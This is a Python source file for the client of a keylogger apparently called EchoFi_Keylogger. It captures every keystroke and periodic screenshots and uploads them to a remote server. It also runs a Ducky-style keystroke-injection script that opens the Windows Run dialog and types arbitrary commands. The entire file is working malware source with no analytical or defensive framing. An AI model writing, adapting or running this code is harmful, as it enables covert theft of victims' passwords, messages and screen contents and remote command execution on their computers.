# Copyright (c) 2025 MrEchoFi_Md. Abu Naser Nayeem (Tanjib Isham)
# Libraries>
import json
import time
import datetime
import requests
from pynput.keyboard import Listener, Key
import threading
import queue
from PIL import ImageGrab
import os
import logging
import pyautogui
import subprocess


logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)


try:
    with open('config.json', 'r') as f:
        config = json.load(f)
except FileNotFoundError:
    logger.error("config.json not found. Using default settings.")
    config = {
        "server_url": "http://localhost:5000",
        "send_interval": 15,
        "screenshot_interval": 60,
        "ducky_script_path": "ducky_script.txt"
    }


SERVER_URL = config['server_url']
SEND_INTERVAL = config['send_interval']
SCREENSHOT_INTERVAL = config['screenshot_interval']
DUCKY_SCRIPT_PATH = config['ducky_script_path']
SECRET_KEY = "supersecretkey123"  


keystroke_queue = queue.Queue()
headers = {'X-Secret-Key': SECRET_KEY}


def on_press(key):
    try:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        key_str = str(key).replace("'", "")
        if key_str.startswith("Key."):
            key_str = f"[{key_str[4:]}]" 
        keystroke_queue.put({"timestamp": timestamp, "key": key_str})
        logger.info(f"Logged keystroke: {key_str}")
    except Exception as e:
        logger.error(f"Error logging keystroke: {e}")


def capture_screenshots():
    while True:
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            screenshot = ImageGrab.grab()
            filepath = f"screenshot_{timestamp}.png"
            screenshot.save(filepath)
            with open(filepath, 'rb') as f:
                files = {'file': (filepath, f, 'image/png')}
                data = {'timestamp': timestamp}
                response = requests.post(f"{SERVER_URL}/upload/screenshot", 
                                       files=files, data=data, headers=headers)
                if response.status_code == 200:
                    logger.info(f"Screenshot {timestamp} sent successfully")
                else:
                    logger.error(f"Failed to send screenshot: {response.status_code} - {response.text}")
            os.remove(filepath)
        except Exception as e:
            logger.error(f"Error capturing screenshot: {e}")
        time.sleep(SCREENSHOT_INTERVAL)


def execute_ducky_script():
    try:
        with open(DUCKY_SCRIPT_PATH, 'r') as f:
            script = f.read()
        lines = script.split('\n')
        output = []
        status = "success"
        
      
        pyautogui.FAILSAFE = True
        pyautogui.PAUSE = 0.5 
        
        
        pyautogui.hotkey('win', 'd')
        time.sleep(1)
        
        for line in lines:
            line = line.strip()
            if not line or line.startswith('REM'):
                continue
            try:
                if line.startswith('STRING'):
                    text = line.replace('STRING ', '', 1)
                    pyautogui.write(text)
                    output.append(f"Typed: {text}")
                    logger.info(f"Ducky: Typed '{text}'")
                elif line == 'ENTER':
                    pyautogui.press('enter')
                    output.append("Pressed ENTER")
                    logger.info("Ducky: Pressed ENTER")
                elif line.startswith('DELAY'):
                    delay = int(line.replace('DELAY ', '', 1))
                    time.sleep(delay / 1000.0)
                    output.append(f"Delayed {delay}ms")
                    logger.info(f"Ducky: Delayed {delay}ms")
                elif line.startswith('GUI r'):  # For opening Run dialog
                    pyautogui.hotkey('win', 'r')
                    output.append("Opened Run dialog")
                    logger.info("Ducky: Opened Run dialog")
                else:
                    output.append(f"Skipped unsupported command: {line}")
                    logger.warning(f"Ducky: Skipped '{line}'")
            except Exception as e:
                output.append(f"Error executing {line}: {str(e)}")
                status = "failure"
                logger.error(f"Ducky: Error on '{line}': {e}")
        
        output_str = '\n'.join(output)
        logger.info(f"Ducky Script executed: {status}")
    except Exception as e:
        output_str = f"Error: {str(e)}"
        status = "failure"
        logger.error(f"Ducky Script error: {e}")
    
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    data = {
        "timestamp": timestamp,
        "script": script,
        "status": status,
        "output": output_str
    }
    try:
        response = requests.post(f"{SERVER_URL}/upload/ducky", json=data, headers=headers)
        if response.status_code == 200:
            logger.info("Ducky Script log sent successfully")
        else:
            logger.error(f"Failed to send Ducky log: {response.status_code} - {response.text}")
    except Exception as e:
        logger.error(f"Error sending Ducky log: {e}")


def send_keystrokes():
    while True:
        try:
            keystrokes = []
            while not keystroke_queue.empty():
                keystrokes.append(keystroke_queue.get())
            if keystrokes:
                data = {"keystrokes": keystrokes}
                response = requests.post(f"{SERVER_URL}/upload/keystrokes", 
                                       json=data, headers=headers)
                if response.status_code == 200:
                    logger.info(f"Sent {len(keystrokes)} keystrokes successfully")
                else:
                    logger.error(f"Failed to send keystrokes: {response.status_code} - {response.text}")
            time.sleep(SEND_INTERVAL)
        except Exception as e:
            logger.error(f"Error sending keystrokes: {e}")


def main():
    logger.info("EchoFi_Keylogger Client Starting...")
    
 
    listener = Listener(on_press=on_press)
    listener.start()
    
  
    screenshot_thread = threading.Thread(target=capture_screenshots, daemon=True)
    screenshot_thread.start()
    
    
    keystroke_thread = threading.Thread(target=send_keystrokes, daemon=True)
    keystroke_thread.start()
    
    
    execute_ducky_script()
    
    
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("Stopping EchoFi_Keylogger Client...")
        listener.stop()

if __name__ == "__main__":
    main()